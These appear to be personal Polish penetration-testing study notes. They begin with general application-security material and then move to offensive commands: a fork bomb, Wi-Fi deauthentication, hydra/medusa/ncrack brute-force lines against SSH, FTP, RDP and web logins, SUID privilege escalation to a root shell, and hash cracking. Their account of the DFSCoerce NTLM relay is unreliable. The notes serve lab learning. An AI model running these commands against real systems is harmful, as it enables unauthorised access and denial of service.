WAF monitoruje i filtruje ruch HTTP, który przechodzi między aplikacją internetową a Internetem. Technologia WAF nie obejmuje wszystkich zagrożeń, ale może współpracować z pakietem narzędzi zabezpieczających w celu stworzenia całościowej ochrony przed różnymi wektorami ataków.

W modelu połączeń systemów otwartych (OSI), WAF służy jako ochrona warstwy protokołu siódmej, która pomaga chronić aplikacje internetowe przed atakami, takimi jak cross-site scripting (XSS), cross-site forgering, SQL injection i inkluzja plików .

W przeciwieństwie do serwera proxy, który chroni tożsamość komputerów klienckich przez pośrednika, WAF działa jak odwrotny serwer proxy, który chroni serwer przed ujawnieniem. WAF służy jako tarcza, która stoi przed aplikacją internetową i chroni ją przed Internetem — klienci przechodzą przez WAF, zanim dotrą do serwera.

Dowiedz się więcej o zaporze aplikacji internetowej Imperva

Samoochrona aplikacji w czasie wykonywania (RASP)
Technologia RASP może analizować zachowanie użytkownika i ruch aplikacji w czasie wykonywania. Jego celem jest pomoc w wykrywaniu i zapobieganiu cyberzagrożeniom poprzez uzyskanie wglądu w kod źródłowy aplikacji oraz analizę słabych punktów i słabych punktów.

Narzędzia RASP mogą identyfikować luki w zabezpieczeniach, które zostały już wykorzystane, przerywać te sesje i generować alerty w celu zapewnienia aktywnej ochrony.

Dowiedz się więcej o samoochronie aplikacji Imperva Runtime

Analiza składu oprogramowania (SCA)
Narzędzia SCA tworzą spis komponentów open source i komercyjnych innych firm używanych w oprogramowaniu. Pomaga dowiedzieć się, które składniki i wersje są aktywnie używane, oraz zidentyfikować poważne luki w zabezpieczeniach mające wpływ na te składniki.

Organizacje używają narzędzi SCA do znajdowania składników innych firm, które mogą zawierać luki w zabezpieczeniach.

Dowiedz się więcej o analizie składu oprogramowania (SCA)

Statyczne testowanie bezpieczeństwa aplikacji (SAST)
Narzędzia SAST pomagają testerom białych skrzynek w sprawdzaniu wewnętrznego działania aplikacji. Obejmuje sprawdzanie statycznego kodu źródłowego i raportowanie o zidentyfikowanych słabościach bezpieczeństwa.

SAST może pomóc znaleźć problemy, takie jak błędy składni, problemy z walidacją danych wejściowych, nieprawidłowe lub niezabezpieczone odwołania lub błędy matematyczne w nieskompilowanym kodzie. Możesz użyć analizatorów binarnych i kodu bajtowego, aby zastosować SAST do skompilowanego kodu.

Dowiedz się więcej o SAST

Dynamiczne testowanie bezpieczeństwa aplikacji (DAST)
Narzędzia DAST pomagają testerom czarnoskrzynkowym w wykonywaniu kodu i sprawdzaniu go w czasie wykonywania. Pomaga wykryć problemy, które mogą stanowić luki w zabezpieczeniach. Organizacje używają DAST do przeprowadzania skanowań na dużą skalę, które symulują wiele złośliwych lub nieoczekiwanych przypadków testowych. Testy te dostarczają raporty dotyczące odpowiedzi aplikacji.

DAST może pomóc zidentyfikować problemy, takie jak ciągi zapytań, użycie skryptów, żądań i odpowiedzi, wyciek pamięci, uwierzytelnianie, obsługa plików cookie i sesji, wykonywanie komponentów innych firm, wstrzykiwanie DOM i wstrzykiwanie danych.

Dowiedz się więcej o DAST

Interaktywne testowanie bezpieczeństwa aplikacji (IAST)
Narzędzia IAST wykorzystują techniki i narzędzia SAST i DAST do wykrywania szerszego zakresu problemów związanych z bezpieczeństwem. Narzędzia te działają dynamicznie, aby kontrolować oprogramowanie w czasie wykonywania. Inspekcja skompilowanego kodu źródłowego odbywa się z poziomu serwera aplikacji.

Narzędzia IAST mogą ułatwić naprawę, dostarczając informacji o pierwotnej przyczynie luk w zabezpieczeniach i identyfikując określone wiersze kodu, którego dotyczy problem. Narzędzia te mogą analizować przepływ danych, kod źródłowy, konfigurację i biblioteki innych firm. Możesz także użyć narzędzi IAST do testowania API.

Dowiedz się więcej o IAST

Testowanie bezpieczeństwa aplikacji mobilnych (MAST)
Narzędzia MAST wykorzystują różne techniki do testowania bezpieczeństwa aplikacji mobilnych. Polega na wykorzystaniu analizy statycznej i dynamicznej oraz badaniu danych kryminalistycznych gromadzonych przez aplikacje mobilne.

Organizacje używają narzędzi MAST do sprawdzania luk w zabezpieczeniach i problemów specyficznych dla urządzeń mobilnych, takich jak jailbreak, wyciek danych z urządzeń mobilnych i złośliwe sieci Wi-Fi.

CNAPP
Platforma ochrony aplikacji natywnych w chmurze (CNAPP) zapewnia scentralizowany panel sterowania dla narzędzi wymaganych do ochrony aplikacji natywnych w chmurze. Łączy platformę ochrony obciążeń w chmurze (CWPP) i zarządzanie stanem bezpieczeństwa w chmurze (CSPM) z innymi funkcjami.

Technologia CNAPP często obejmuje zarządzanie uprawnieniami tożsamości, wykrywanie i ochronę API oraz automatyzację i bezpieczeństwo orkiestracji dla platform orkiestracji kontenerów, takich jak Kubernetes.

Najlepsze praktyki dotyczące bezpieczeństwa aplikacji
Oto kilka najlepszych praktyk, które mogą pomóc w efektywniejszym ćwiczeniu bezpieczeństwa aplikacji.

Wykonaj ocenę zagrożenia
Posiadanie listy wrażliwych zasobów, które należy chronić, może pomóc w zrozumieniu zagrożeń, przed jakimi stoi Twoja organizacja, i sposobów ich łagodzenia. Zastanów się, jakich metod haker może użyć do złamania zabezpieczeń aplikacji, czy są stosowane istniejące środki bezpieczeństwa i czy potrzebujesz dodatkowych narzędzi lub środków ochronnych.

Ważne jest również, aby realistycznie podchodzić do swoich oczekiwań w zakresie bezpieczeństwa. Nawet przy najwyższym poziomie ochrony nie ma rzeczy niemożliwych do zhakowania. Musisz także szczerze powiedzieć, co Twój zespół może wytrzymać w dłuższej perspektywie. Jeśli będziesz naciskać zbyt mocno, standardy i praktyki bezpieczeństwa mogą zostać zignorowane. Pamiętaj, że bezpieczeństwo to przedsięwzięcie długoterminowe i potrzebujesz współpracy innych pracowników oraz swoich klientów.

Przesuń zabezpieczenia w lewo
Firmy przechodzą z rocznych wydań produktów na wydania miesięczne, tygodniowe lub dzienne. Aby dostosować się do tej zmiany, testowanie bezpieczeństwa musi być częścią cyklu rozwoju, a nie dodane po namyśle. W ten sposób testy bezpieczeństwa nie przeszkadzają w wydawaniu produktu.

Dobrym pierwszym krokiem przed wprowadzeniem tych zmian jest pomoc pracownikom ds. bezpieczeństwa w zrozumieniu procesów programistycznych i budowaniu relacji między zespołami ds. bezpieczeństwa i programistów. Pracownicy ds. bezpieczeństwa muszą nauczyć się narzędzi i procesów używanych przez programistów, aby mogli organicznie zintegrować zabezpieczenia. Gdy zabezpieczenia są płynnie zintegrowane z procesem rozwoju, programiści chętniej je stosują i budują zaufanie.

Musisz także znaleźć sposób na zautomatyzowanie testowania bezpieczeństwa dla potoków CI/CD. Integracja zautomatyzowanych narzędzi bezpieczeństwa z potokiem CI/CD pozwala programistom na szybkie naprawienie problemów w krótkim czasie po wprowadzeniu odpowiednich zmian.

Dowiedz się więcej ze szczegółowego przewodnika po testowaniu przesunięcia w lewo

Nadaj priorytet swoim operacjom naprawczym
Luki w zabezpieczeniach są coraz większe, a deweloperom trudno jest rozwiązać wszystkie problemy. Biorąc pod uwagę skalę zadania, priorytetyzacja ma kluczowe znaczenie dla zespołów, które chcą zapewnić bezpieczeństwo aplikacji.

Skuteczne ustalanie priorytetów wymaga przeprowadzenia oceny zagrożenia w oparciu o wagę podatności — przy użyciu ocen CVSS i innych kryteriów, takich jak znaczenie operacyjne aplikacji, której dotyczy luka. Jeśli chodzi o luki w zabezpieczeniach oprogramowania open source, musisz wiedzieć, czy zastrzeżony kod faktycznie wykorzystuje lukę w zabezpieczeniach komponentów open source. Jeśli funkcja podatnego komponentu nigdy nie jest wywoływana przez twój produkt, to jego ocena CVSS jest znacząca, ale nie ma wpływu ani ryzyka.

Mierz wyniki bezpieczeństwa aplikacji
Ważne jest, aby mierzyć i raportować powodzenie programu ochrony aplikacji. Zidentyfikuj wskaźniki, które są najważniejsze dla Twoich kluczowych decydentów i przedstaw je w łatwy do zrozumienia i praktyczny sposób, aby uzyskać poparcie dla Twojego programu.

Podawanie dyrektorom zbyt wielu wskaźników na wczesnym etapie może być przytłaczające i, szczerze mówiąc, niepotrzebne. Głównym celem jest wskazanie, w jaki sposób program bezpieczeństwa aplikacji jest zgodny z wewnętrznymi politykami oraz pokazanie wpływu w zakresie redukcji podatności i zagrożeń oraz zwiększenia odporności aplikacji.

Zarządzaj uprawnieniami
Ważne jest, aby ograniczyć uprawnienia, szczególnie w przypadku systemów o znaczeniu krytycznym i wrażliwych. Najlepsze rozwiązania dotyczące bezpieczeństwa aplikacji ograniczają dostęp do aplikacji i danych do tych, którzy ich potrzebują, kiedy ich potrzebują — jest to znane jako zasada najmniejszych uprawnień. Najmniejsze przywileje mają kluczowe znaczenie z dwóch powodów:

Hakerzy mogą naruszyć mniej uprzywilejowane konta i ważne jest, aby upewnić się, że nie mogą uzyskać dostępu do wrażliwych systemów.
Zagrożenia wewnętrzne są tak samo niebezpieczne, jak napastnicy zewnętrzni. Jeśli wtajemniczeni się zepsują, ważne jest, aby upewnić się, że nigdy nie będą mieli więcej przywilejów niż powinni – ograniczając szkody, jakie mogą wyrządzić.
Bezpieczeństwo aplikacji dzięki Imperva
Imperva zapewnia kompleksową ochronę aplikacji, interfejsów API i mikrousług:

Zapora aplikacji sieci Web — zapobiegaj atakom dzięki światowej klasy analizie ruchu internetowego kierowanego do aplikacji.

Runtime Application Self-Protection (RASP) — wykrywanie ataków w czasie rzeczywistym i zapobieganie im ze środowiska wykonawczego aplikacji jest dostępne wszędzie tam, gdzie znajdują się aplikacje. Powstrzymaj zewnętrzne ataki i zastrzyki oraz zmniejsz zaległości w zabezpieczeniach.

Bezpieczeństwo API — zautomatyzowana ochrona API zapewnia ochronę punktów końcowych API w miarę ich publikowania, chroniąc aplikacje przed wykorzystaniem.

Zaawansowana ochrona przed botami — zapobiegaj atakom logiki biznesowej ze wszystkich punktów dostępu — witryn internetowych, aplikacji mobilnych i interfejsów API. Uzyskaj bezproblemowy wgląd i kontrolę nad ruchem botów, aby powstrzymać oszustwa online poprzez przejęcie konta lub konkurencyjne ceny.

Ochrona przed atakami DDoS — Blokuj ruch ataków na brzegu sieci, aby zapewnić ciągłość biznesową z gwarantowanym czasem pracy bez wpływu na wydajność. Zabezpiecz swoje zasoby lokalne lub w chmurze — niezależnie od tego, czy są hostowane w AWS, Microsoft Azure czy Google Public Cloud.

Analiza ataków — zapewnia pełną widoczność dzięki uczeniu maszynowemu i wiedzy o domenie w całym stosie zabezpieczeń aplikacji, aby ujawniać wzorce w hałasie i wykrywać ataki na aplikacje, umożliwiając izolowanie i zapobieganie kampaniom ataków.

Ochrona po stronie klienta — uzyskaj wgląd i kontrolę nad kodem JavaScript innych firm, aby zmniejszyć ryzyko oszustw w łańcuchu dostaw, zapobiegać naruszeniom danych i atakom po stronie klienta.

------------------------------------------------------------------------------------------------------
Najczęstsze ataki dos/ddos

Ataki oparte na woluminach
Obejmuje powodzi UDP, powodzi ICMP i innych powodzi sfałszowanych pakietów. Celem ataku jest nasycenie przepustowości zaatakowanej strony, a wielkość jest mierzona w bitach na sekundę (Bps).

Ataki na protokoły 
Obejmuje powodzie SYN, ataki pofragmentowanych pakietów, Ping of Death, Smurf DDoS i inne. Ten typ ataku zużywa rzeczywiste zasoby serwera lub pośredniego sprzętu komunikacyjnego, takiego jak zapory ogniowe i systemy równoważenia obciążenia , i jest mierzony w pakietach na sekundę (Pps).

Ataki w warstwie aplikacji 
Obejmuje ataki typu low-and-slow, powodzie GET/POST, ataki skierowane na podatności Apache, Windows lub OpenBSD i inne. Celem tych ataków, składających się z pozornie uzasadnionych i niewinnych żądań, jest awaria serwera WWW, a ich wielkość jest mierzona w żądaniach na sekundę (Rps).
------------------------------------------------------------------------------------------------------

**OTWARTE PORTY DO WYKORZYSTYWANIA:**
- 21/tcp otwarte ftp vsftpd 2.3.4
- 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protokół 2.0)
- 23/tcp otwarty telnet Linux telnetd
- 25/tcp otwórz smtp Postfix smtpd
- 53/tcp otwarta domena ISC BIND 9.4.2
- 80/tcp otwarty http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
- Filtrowany pop 110/tcp3
- 111/tcp otwarty rpcbind 2 (RPC #100000)
- 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (grupa robocza: WORKGROUP)
- 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (grupa robocza: WORKGROUP)
- 512/tcp open exec netkit-rsh rexecd
- 513/tcp otwarte logowanie OpenBSD lub Solaris rlogind
- 514/tcp otwarta powłoka Netkit rshd
- 1099/tcp otwórz rmiregistry GNU Classpath grmiregistry
- 1524/tcp otwarta powłoka Metasploitable powłoka główna
- 2049/tcp otwarte nfs 2-4 (RPC #100003)
- 2121/tcp otwarty ftp ProFTPD 1.3.1
- 3306/tcp otwórz mysql MySQL 5.0.51a-3ubuntu5
- 5432/tcp otwarte postgresql PostgreSQL DB 8.3.0 - 8.3.7
- 5900/tcp otwarte vnc VNC (protokół 3.3)
- 6000/tcp otwarte X11 (odmowa dostępu)
- 6667/tcp otwarty IRC UnrealIRCd
- 8009/tcp otwarty ajp13 Apache Jserv (Protokół v1.3)
- 8180/tcp otwarty silnik http Apache Tomcat/Coyote JSP 1.1

https://www.exploit-db.com/google-hacking-database


* SMTP ( Simple Mail Transfer Protocol) - Służy do obsługi wysyłania wiadomości e-mail. 
* POP3 (Post Office Protocol) — odpowiada za przesyłanie poczty e-mail między klientem a serwerem pocztowym. 
IMAP (Internet Message Access Protocol) —  odpowiada za przesyłanie wiadomości e-mail między klientem a serwerem pocztowym. 
![805172273b08debff6a0c2af033c63fa.png](:/e543746967c4426b9e04450b7a88a105)

Zmienając rekordy DNS tak, aby zawierały listę Sender Policy Frramework (SPF) mozna określić który serwery mogą wysyłać wiadomości e-mail z mojej domeny.

Wdrażając DKIM można udowodnić ze wiadomość e-mail został wysłany z Mojej domeny. 

Fork bomba jest formą ataku typu „odmowa usługi” (DoS) na system oparty na Linuksie lub Uniksie . Wykorzystuje działanie. :(){ :|:& };: zwana również wirusem królika lub wabbit) to atak typu „odmowa usługi”, w którym proces nieustannie się replikuje, aby wyczerpać dostępne zasoby systemowe, spowalniając lub powodując awarię systemu z powodu braku zasobów .

atak deauthentication - pozwala nam odłączyć dowolne urządzenie od dowolnej sieci, która znajduje się w naszym zasięgu, nawet jeśli sieć ma szyfrowanie lub używa klucza. będziemy udawać klienta i wysłać pakiet deauthentication do routera, zmieniając nasz adres MAC na adres MAC klienta i informując router, że chcemy się od ciebie odłączyć. W tym samym czasie będziemy udawać router, zmieniając nasz adres MAC na adres MAC routera, aż do momentu odłączenia klienta, którego żądamy. Następnie połączenie zostanie utracone

![deauthenticate-the-wireless-client.png](:/256ceb7ed9734324b38cbcaadbc521d8)

POLECENIE - aireplay-ng --deauth 100000 -a [NetworkMac] -c [TargetMac] [wlan0/eth0]

port 21 , który jest portem FTP. FTP to rodzaj usługi, która jest instalowana, aby umożliwić użytkownikom przesyłanie i pobieranie plików ze zdalnego serwera. Usługa FTP zwykle używa nazwy użytkownika i hasła, ale widzimy, że ta usługa została źle skonfigurowana i umożliwia anonimowe logowanie przez FTP. W ten sposób będziemy mogli zalogować się bez hasła
![server-side-attack-basics2.png](:/bef96ccf939e41b79f955760bcef3a4c)
Wszystko, co musimy zrobić, to pobrać klienta FTP, takiego jak FileZilla . Teraz będziemy mogli łączyć się za pomocą tego adresu IP na porcie 21. Możemy również wygooglować serwer FTP, który w naszym przypadku to vsftpd 2.3.4 , i sprawdzić, czy ma jakieś problemy, czy ma jakieś błędy w konfiguracji lub czy zawiera wszelkie znane luki w wykonywaniu kodu. Kiedy już to wygooglujemy, zobaczymy, że vsftpd 2.3.4

port 512 - Komputer docelowy działa na Ubuntu i widzimy, że tutaj używa usługi rsh-client do połączenia. Dlatego musimy zainstalować pakiet rsh-client , aby połączyć się z tą usługą.
rlogin -l root IP

NARZĘDZIE PATATOR KOMENDA - proxychains patator ssh_login host=example.com user=root password=/home/kali/Desktop/mentalist/tests/first  0=/home/kali/Desktop/mentalist/tests/first -x ignore:mesg='Authentication failed.'

proxychains dmitry example.com -w -n -s -e -o output.out

sudo proxychains xprobe2 example.com

technika ataku typu adversary-in-the-middle (AitM) zdolną do ominięcia uwierzytelniania wieloskładnikowego

CAPEC-117: Przechwytywanie - Przeciwnik monitoruje strumienie danych do lub od celu w celu zbierania informacji. Atak ten można przeprowadzić wyłącznie w celu zebrania poufnych informacji lub w celu wsparcia dalszego ataku na cel. Ten wzorzec ataku może obejmować sniffowanie ruchu sieciowego, a także innych rodzajów strumieni danych (np. radiowych). Przeciwnik może próbować zainicjować ustanowienie strumienia danych lub pasywnie obserwować komunikację w miarę jej rozwoju. We wszystkich wariantach tego ataku przeciwnik nie jest zamierzonym odbiorcą strumienia danych. W przeciwieństwie do innych sposobów zbierania informacji (np. kierowanie wycieków danych), przeciwnik musi aktywnie pozycjonować się tak, aby obserwować wyraźne kanały danych (np. ruch sieciowy) i czytać zawartość. Jednak ten atak różni się od Adversary-In-the-Middle ( https://capec.mitre.org/data/definitions/94.html), ponieważ przeciwnik nie zmienia treści komunikatów ani nie przekazuje danych do zamierzonego odbiorcy.

Uzyskaj adres mac jednego z komputerów w klasie komputerów, aby przeprowadzić atak mac spoofing

Jak działają ataki łańcucha dostaw? Aby atak w łańcuchu dostaw zadziałał, hakerzy muszą wstawić złośliwy kod do oprogramowania lub znaleźć sposoby na złamanie zabezpieczeń protokołów lub komponentów sieciowych . Gdy odkryją możliwość włamania, wykorzystują ją, uzyskując dostęp do krytycznych zasobów cyfrowych

ftp anonymous login:
**sudo proxychains nmap -p 21 IP --script ftp-anon**
bruteforce: **proxychains  ncrack -U Username.txt -P Password.txt ftp://10.10.10.10**
Logowanie: **proxychains ftp IP
defultowe hasło i nazwa użytkownika: **anonymous**

BRUTEFORCE rdp:
SKANOWANIE: sudo proxychains nmap 10.10.10.0/24 -p 3389
 nmap -sV 10.10.10.10
SPRAWdZANIE: msfconsole
           use auxiliary/scanner/rdp/rdp_scanner
          set RHOSTS 10.10.10.10
          exploit
ATAK: ./crowbar.py --server 10.10.10.10/32 -b rdp -u /usr/share/usernames -C /usr/share/passwords
lub mogę użyć ncracka.
POŁĄCZENIE: xfreerdp /u:USERNAME /p:PASSWORd /v:10.10.10.10

znajdywanie podatnych: shodan search remote desktop
https://youtu.be/xEt5VSsLRho?list=LL
.
port 8081 Konsola użytkownika blackice-icecap" to oprogramowanie administracyjne dla systemu firewall.

Wireless Application Protocol (WAP) to specyfikacja zestawu protokołów komunikacyjnych w celu standaryzacji sposobu, w jaki urządzenia bezprzewodowe, takie jak telefony komórkowe i urządzenia nadawczo-odbiorcze, mogą być używane do dostępu do Internetu, w tym poczty e-mail, sieci WWW, grup dyskusyjnych i wiadomości błyskawicznych.

./enum4linux.pl -a IP

https://www.digitalocean.com/community/tutorials/5-common-server-setups-for-your-web-application

BRUTEFORCE SSH: proxychains medusa -h 10.10.10.10 -U Username.txt -P Password.txt -M ssh -n 22

FTP hacking: medusa -H hosts.txt -U users.txt -P pass.txt -M ftp -v 6

oraz
medusa -h 10.10.1.141 -U users.txt -P pass.txt -M ftp -w 07

BRUTEFORCE ONLINE:
 musisz określić typ ataku internetowego, niezależnie od tego, czy jest to „http-post-form”, „http-get-form”, czy też wykorzystuje uwierzytelnianie podstawowe. Następnie musisz określić ścieżkę do pliku do ataku. Następnie musisz określić parametry ataku (nazwę użytkownika i hasło). Ponadto musisz określić symbole zastępcze dla użytkownika i przekazać zmienne. Na koniec musisz określić wszelkie pliki cookie. Przykład tego możesz zobaczyć poniżej:

hydra -L users.txt -P password.txt 10.0.2.5  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V

**różne ataki o których mogłem nie słyszeć/zapomnieć:**
1. Ataki desynchronizujące

2. Techniki unikania WAF (wyróżniona  malformed chunk Pawła Hałdrzyńskiego)

3. Atakowanie interfejsów internetowych MS Exchange

4.ImageMagick - Wstrzyknięcie powłoki za pomocą hasła PDF

5.Nieuwierzytelniony RCE w MobileIron MDM

6.Przemycanie nagłówków HTTP przez odwrotne serwery proxy

7. Transmisja strumieniowa NAT

8.Kiedy TLS Cię zhakuje (SSRF często ma krytyczny wpływ, ale jeśli nie ma wygodnych usług internetowych, do których można by go skierować, może wydawać się frustrująco nieszkodliwy. When TLS Hacks You to technika inspirowana wstrzykiwaniem SNI autorstwa Joshua Maddux , która w elegancki sposób łączy ponowne wiązanie DNS i wznawianie sesji TLS w celu wykorzystania wewnętrznych usług, które nie obsługują protokołu HTTP. Jak to ujął deskryptor pliku, przywrócił gopher://!)

9. Atakowanie kontekstów drugorzędnych w aplikacjach internetowych

10. Przenośna filtracja danych: XSS dla plików PDF

11.Przemyt H2C: żądanie przemytu za pośrednictwem zwykłego tekstu HTTP/2

https://portswigger.net/research/top-10-web-hacking-techniques-of-2020-nominations-open

eskalacja uprawnień - plik binarny służący do zmiany hasła ma ustawiony bit SUID (/usr/bin/passwd) komenda - find / -user root -perm -4000 -exec ls -ldb {} \;
systemctl , to proces istniejący w systemach operacyjnych Linux, który służy do uruchamiania różnych usług, takich jak serwery Apache. Ze względu na poziom wpływu, jaki systemctl może mieć na system, jest on generalnie zarezerwowany dla uprzywilejowanych użytkowników, takich jak administratorzy systemu. Istnieją przypadki, w których uprawnienia do systemctl mogą być błędnie skonfigurowane, co pozwala na wykorzystanie ich do eskalacji uprawnień.

Zmieniając „id > /tmp/output” na „sh -p” lub „chmod +s /bin/bash”, a następnie uruchomić „bash -p” , mogę otrzymać powłokę root. Po śladach i błędach polecenie, które działało najlepiej, to „chmod + s /bin/bash”, a następnie „bash –p”

amanie hasha :

PRZYGOTOWYWANIE: echo 'hash' | > hash.txt
ŁAMANIE: john hash.txt --wordlist=rockyou.txt          #rockyou.txt to nazwa listy haseł.

 27 ways to learn ethical hacking for free:

1. Root Me — Challenges.
2. Stök's YouTube — Videos.
3. Hacker101 Videos — Videos.
4. InsiderPhD YouTube — Videos.
5. EchoCTF — Interactive Learning.
6. Vuln Machines — Videos and Labs.
7. Try2Hack — Interactive Learning.
8. Pentester Land — Written Content.
9. Checkmarx — Interactive Learning.
10. Cybrary — Written Content and Labs.
11. RangeForce — Interactive Exercises.
12. Vuln Hub — Written Content and Labs.
13. TCM Security — Interactive Learning.
14. HackXpert — Written Content and Labs.
15. Try Hack Me — Written Content and Labs.
16. OverTheWire — Written Content and Labs.
17. Hack The Box — Written Content and Labs.
18. CyberSecLabs — Written Content and Labs.
19. Pentester Academy — Written Content and Labs.
20. Bug Bounty Reports Explained YouTube — Videos.
21. Web Security Academy — Written Content & Labs.
22. Securibee's Infosec Resources — Written Content.
23. Jhaddix Bug Bounty Repo — Written Content.
24. Zseano's Bug Bounty Methodology — Free Ebook.
25. Awesome AppSec GitHub — Written Content.
26. NahamSec's Bug Bounty Repo — Written Content.
27. Kontra Application Security — General Learning.

	SSRF - https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/

BLOODHOUND - sudo neo4j console
firefox: localhost:7474
start bloodhound

## PrintNightmare: 
była krytyczną luką w zabezpieczeniach systemu operacyjnego Microsoft Windows . Luka wystąpiła w usłudze bufora wydruku . Były dwa warianty, jeden umożliwiający zdalne wykonanie kodu (CVE-2021-34527), a drugi prowadzący do eskalacji uprawnień (CVE-2021-1675). Trzecia luka w zabezpieczeniach (CVE-2021-34481) została ogłoszona 15 lipca 2021 r. i zaktualizowana do zdalnego wykonywania kodu przez firmę Microsoft w sierpniu.




PrivateEscalation: 
Zwykle zalecałbym uruchomienie LinEnum.sh lub LinPEAS, ale w tym przypadku TryHackMe wskazuje nam właściwy kierunek; będziemy nadużywać nieprawidłowego pliku binarnego SUID.

Następującego polecenia można użyć do znalezienia wszystkich plików binarnych w systemie, które mają ustawiony bit SUID:

znajdź / -perm -u=s -type f 2>/dev/null

**Pro-tip, uruchom to polecenie również na swoim komputerze Kali; pod warunkiem, że nie dodałeś żadnych plików binarnych SUID na własnej maszynie, jest to przydatne do sprawdzania krzyżowego w celu znalezienia niespójnych plików binarnych.




https://gtfobins.github.io/  <-->
Ta witryna zawiera listę kilku popularnych plików binarnych systemu Linux i sposobów ich wykorzystania w celu ominięcia lokalnych ograniczeń bezpieczeństwa.


https://github.com/samanL33T/Awesome-Mainframe-Hacking
„System komputerowy typu mainframe” odnosi się do dużego, wydajnego i scentralizowanego systemu komputerowego przeznaczonego do przetwarzania ogromnych ilości danych i obsługi wielu użytkowników jednocześnie. Systemy mainframe są często używane przez duże organizacje i agencje rządowe do wykonywania krytycznych funkcji, takich jak transakcje finansowe, zarządzanie opieką zdrowotną i badania naukowe.

hydra.exe -q -v -V -t 30 -L _logins.txt -P _passwords.txt -M _servers.txt -o ./__results.txt http-post-form "/ui/#/login:<koperta xmlns ='http\://schemas.xmlsoap.org/soap/envelope/' xmlns\:xsi='http\://www.w3.org/2001/XMLSchema-instance'><Body><Login xmlns=' urn\:vim25'><_this type='SessionManager'>ha-sessionmgr</_this><userName>^USER^</userName><password>^PASS^</password><locale>en-US</locale </Login></Body></Envelope>:S=Cannot"

Ta komenda wykorzystuje narzędzie Hydra do przeprowadzenia ataku typu "brute force" na stronie internetowej. Poniżej opis poszczególnych parametrów:

hydra.exe - plik wykonywalny narzędzia Hydra
-q -v -V - parametry wypisujące komunikaty o błędach, postępach i wynikach działania programu
-t 30 - liczba wątków używanych do ataku, w tym przypadku 30
-L _logins.txt - plik zawierający listę loginów, które będą używane podczas ataku. Loginy są zapisane w pliku _logins.txt.
-P _passwords.txt - plik zawierający listę haseł, które będą używane podczas ataku. Hasła są zapisane w pliku _passwords.txt.
-M _servers.txt - plik zawierający listę adresów serwerów, które będą atakowane. Adresy serwerów są zapisane w pliku _servers.txt.
-o ./__results.txt - plik wynikowy, w którym zostaną zapisane wyniki ataku. Wyniki zostaną zapisane w pliku __results.txt.
http-post-form - metoda HTTP, która zostanie użyta podczas ataku.
"/ui/#/login:<koperta xmlns ='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><Body><Login xmlns=' urn\:vim25'><_this type='SessionManager'>ha-sessionmgr</_this><userName>^USER^</userName><password>^PASS^</password><locale>en-US</locale </Login></Body></Envelope>:S=Cannot" - przy użyciu metody HTTP POST, atakujący próbuje zalogować się na stronie /ui/#/login, używając listy loginów i haseł z plików _logins.txt i _passwords.txt. Znaczniki ^USER^ i ^PASS^ zostaną zastąpione odpowiednio loginem i hasłem z listy.



 uzyskanie w pełni kwalifikowanej nazwy domeny: `crackmapexec smb <IP>`
(Można podać zakres adresów IP) Lub `nmap <IP> -p 445,137,138 --script smb-os-discovery`



## **Find Servers behind tor:**
- server status webrequest (unset hta), front end caching (misconfigured varnish), Carnegie Melon method, Global viewership and other techniques detailed by Neal (guy from fotoforensics), SSL Cert sometimes, messing up modprox, so on

- The onion service only needs to bind to the localhost. If it is configured for an interface IP it might be found because of unique attributes like HTTP headers.

- https://riseup.net/ca/security/network-security/tor/onionservices-best-practices#be-careful-of-localhost-bypasses

Blockchain to rozproszona baza danych lub rejestr, który jest współdzielony między węzłami sieci komputerowej. Jako baza danych, blockchain przechowuje informacje elektronicznie w formacie cyfrowym. Ethereum to protokół blockchain, taki jak bitcoin. W przeciwieństwie do Bitcoin, Ethereum jest Turing-complete, co oznacza, że ​​może z grubsza naśladować aspekty obliczeniowe dowolnego innego komputera ogólnego przeznaczenia i uruchamiać programy w świecie rzeczywistym.

eskalacja uprawnień np. windows 11/10, server 2012/20 - https://github.com/BeichenDream/GodPotato


=========================================================
Nowa forma ataku na przekaźnik Windows NTLM wykorzystuje rozproszony system plików MS-DFSNM do przejęcia kontroli nad domeną. link do PoC - https://github.com/Wh04m1001/DFSCoerce

WYTŁUMACZENIE: Przekaźnik Windows NTLM jest mechanizmem uwierzytelniania, który umożliwia użytkownikom korzystanie z zasobów sieciowych. System ten wykorzystuje protokół NTLM (NT LAN Manager) do autoryzacji użytkowników.

Rozproszony system plików MS-DFSNM (Microsoft Distributed File System Namespace Management) służy do zarządzania i udostępniania zasobów plikowych w sieciach rozproszonych. Jest to usługa, która umożliwia tworzenie wirtualnej struktury katalogów, która ukrywa faktyczną lokalizację plików i folderów na serwerach.

Przekaźnik Windows NTLM wykorzystuje rozproszony system plików MS-DFSNM, aby przekierować zapytania uwierzytelniające do właściwych serwerów w sieci. Dzięki temu użytkownicy mogą korzystać z zasobów sieciowych bez konieczności znać ich dokładnej lokalizacji.

W praktyce, kiedy użytkownik próbuje uzyskać dostęp do zasobów sieciowych, przekaźnik Windows NTLM przekierowuje jego zapytanie do serwera MS-DFSNM. Następnie MS-DFSNM sprawdza, gdzie znajdują się właściwe pliki i przekierowuje zapytanie do odpowiedniego serwera w sieci. Po autoryzacji użytkownika, serwer przekazuje odpowiedź do przekaźnika Windows NTLM, który następnie przekazuje ją z powrotem do użytkownika.

Dzięki temu mechanizmowi użytkownicy mogą korzystać z zasobów sieciowych, bez konieczności znajomości ich faktycznej lokalizacji. Rozproszony system plików MS-DFSNM działa jako pośrednik, który zapewnia efektywny dostęp do zasobów sieciowych i ułatwia zarządzanie nimi.
============================================================


ttps://itpracticetest.online
https://dl.acm.org/

https://redteam.guide/docs/checklists/red-team-checklist/
http://redteam.guide/

## zawsze sprawdzać foldery nie ls tylko ls -la -ls

poradnik do narzedzia git https://asciinema.org/a/24072


TLS - https://github.com/projectdiscovery/tlsx

nauka cobalt strike - https://github.com/zer0yu/Awesome-CobaltStrike

classic - https://owasp.org/

gamepwn - https://www.hackthebox.com/blog/intro-to-gamepwn-aka-game-hacking

przydatne polecenia PowerShell:

`powershell -c "Get-Service"`
